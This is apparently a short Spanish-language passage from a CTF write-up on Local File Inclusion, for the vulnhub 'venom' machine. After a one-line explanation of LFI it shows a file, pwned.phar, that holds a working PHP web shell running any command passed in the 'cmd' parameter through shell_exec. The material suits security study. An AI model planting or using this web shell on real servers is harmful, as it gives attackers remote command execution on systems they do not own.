# LOCAL FILE INCLUSION LFI
---
## CREACIÓN PHP LFI .phar
Como se ha dicho al principio, el LFI ocurre cuando mediante un campo de entrada se está llamando a la ruta de un archivo local. Típicamente, esta situación la veremos en variables de PHP, pero no hay que limitar la vulnerabilidad a esto porque sería erróneo
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/exploits]
└─$ cat pwned.phar        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.phar
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   3   │ ?>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```